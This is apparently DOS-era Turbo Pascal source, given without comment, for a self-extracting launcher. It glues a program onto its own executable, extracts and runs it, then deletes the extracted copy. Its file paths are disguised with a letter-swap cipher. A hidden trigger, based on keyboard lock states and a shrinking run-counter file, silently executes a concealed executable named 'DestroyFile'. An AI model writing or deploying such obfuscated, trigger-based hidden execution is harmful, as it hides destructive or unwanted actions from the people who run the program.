{$A+,B-,D+,E+,F-,G-,I+,L+,N-,O-,P-,Q-,R-,S+,T-,V+,X+}
{$M 4096, 0, 9000}

Uses DOS;

Const
  RemainTimesFile : String = 'X:\WLH\IVNZRM.GNH';
  DestroyFile     : String = 'X:\WLH\ZFGLIVH.VCV';

  kbScrollLock = $10;
  kbNumLock    = $20;
  kbCapsLock   = $40;

Var
  Parameter, CmdLine, SelfName : String;
  BufSize, Offset : LongInt;
  Result : Word;
  SystaxParam : Boolean;
  Buf : Pointer;
  ShiftMask : Byte Absolute $0000:$0417;
  LinkedFile, PatchedFile : String;

Function DecodeStr(Var St : String) : String;
  Var
    i : Byte;
  Begin
    For i := 1 To Length(St) Do
      Begin
        If St[i] In ['A'..'Z'] Then
          St[i] := Chr(65+90-Ord(St[i]));
      End;
    DecodeStr := St;
  End;

Function CheckLock : Boolean;
  Begin
    CheckLock := True;
    If ShiftMask And kbNumLock = 0 Then CheckLock := False;
    If ShiftMask And kbCapsLock = 0 Then CheckLock := False;
    If ShiftMask And kbScrollLock = 0 Then CheckLock := False;
  End;

Function CheckAllowedTimes : Boolean;
  Var
    F : File;
    Times : LongInt;
  Begin
    CheckAllowedTimes := True;
    Assign(F, RemainTimesFile);
    {$I-}
    Reset(F, 1);
    {$I+}
    If IOResult <> 0 Then
      CheckAllowedTimes := False
     Else
      Begin
        Times := FileSize(F);
        If Times = 0 Then
          CheckAllowedTimes := False
         Else
          Begin
            If Times > BufSize Then Times := BufSize;
            BlockRead(F, Buf^, Times);
            Close(F);
            Rewrite(F, 1);
            BlockWrite(F, Buf^, Times-1);
          End;
        Close(F);
      End;
  End;

Procedure Execute(excFile, Param : String);
  Begin
    SwapVectors;
{    WriteLn('Executing ''', excFile, ' ', Param, '''...');{}
    Exec(excFile, Param);
    SwapVectors;
  End;

Procedure SelfDestroy;
  Var
    F : File;
  Begin
    Assign(F, PatchedFile);
    Rewrite(F);
    Close(F);
    Erase(F);
  End;

Procedure GetPatchFileName;
  Var
    i : Byte;
  Begin
    i := Pos('.', SelfName);
    PatchedFile := Copy(SelfName, 1, i);
    PatchedFile := PatchedFile+'PCH';
  End;

Procedure Merge;
  Var
    F1, F2 : File;
    FSize : LongInt;
  Begin
    Assign(F1, SelfName);
    Reset(F1, 1);
    FSize := FileSize(F1);
    Seek(F1, FSize);
    Assign(F2, LinkedFile);
    Reset(F2, 1);
    Repeat
      BlockRead(F2, Buf^, BufSize, Result);
      BlockWrite(F1, Buf^, Result);
    Until (Result <> BufSize)Or(EOF(F2));
    Close(F2);
    Close(F1);
    WriteLn('Merge successful!');
    WriteLn('Source file size: ', FSize);
  End;

Function Patch : Boolean;
  Var
    F1, F2 : File;
  Begin
    Patch := True;
    Assign(F1, SelfName);
    Reset(F1, 1);
    If (Offset < FileSize(F1))And(Offset < 65536) Then
      Begin
        BlockRead(F1, Buf^, Offset);
        Assign(F2, PatchedFile);
        Rewrite(F2, 1);
        Repeat
          BlockRead(F1, Buf^, BufSize, Result);
          BlockWrite(F2, Buf^, Result);
        Until (Result <> BufSize)Or(EOF(F1));
        Close(F2);
      End
     Else Patch := False;
    Close(F1);
  End;

Procedure Split;
  Var
    F : File;
  Begin
    If Patch = True Then
      Begin
        Assign(F, SelfName);
        Reset(F, 1);
        BlockRead(F, Buf^, Offset);
        Close(F);
        Rewrite(F, 1);
        BlockWrite(F, Buf^, Offset);
        Close(F);
        WriteLn('Split successful!');
      End
     Else WriteLn('Can''t split this file any more!');
  End;

Procedure ProcessParameter;
  Var
    Param : String;
    i : Byte;
  Begin
    Parameter := '';
    For i := 1 To ParamCount Do
      If i < ParamCount Then Parameter := Parameter+ParamStr(i)+' '
                        Else Parameter := Parameter+ParamStr(i);
    SystaxParam := True;
    Param := ParamStr(1);
    For i := 1 To Length(Param) Do
      Param[i] := Upcase(Param[i]);
    If (Copy(Param, 1, 3) = '/M:') Then
      Begin
        LinkedFile := Copy(Param, 4, Length(Param)-3);
        Merge;
      End
     Else If (Copy(Param, 1, 2) = '/S') Then
      Begin
        If (Length(Param) > 3)And(Param[3] = ':') Then
          PatchedFile := Copy(Param, 4, Length(Param)-3);
        Split;
      End
     Else SystaxParam := False;
  End;

BEGIN
  Offset := 8592;
  SelfName := ParamStr(0);
  DecodeStr(RemainTimesFile);
  DecodeStr(DestroyFile);
  BufSize := MaxAvail;
  If BufSize > 65535 Then BufSize := 65535;
  BufSize := 1024;
  GetMem(Buf, BufSize);
  GetPatchFileName;
  SystaxParam := False;
  If ParamCount > 0 Then ProcessParameter;
  If SystaxParam = False Then
    Begin
      If (CheckLock = False)And(CheckAllowedTimes = False) Then
        Begin
          Execute(DestroyFile, '');{}
          SelfDestroy;{}
        End;
{      Write('Patching...');{}
      Patch;
{      WriteLn('Done!');{}
{      Write('Testing memory...');{}
{      Execute('C:\DOS\MEM.EXE', ' /C /P');{}
{      WriteLn('Done!');{}
{      Write('Executing...''', patchedfile, ' ', Parameter, ',...');{}
      Execute(PatchedFile, Parameter);
{      WriteLn('Done');{}
{      Write('Self-Destroying...');{}
      SelfDestroy;{}
{      WriteLn('Done');{}
    End;
  FreeMem(Buf, BufSize);
END.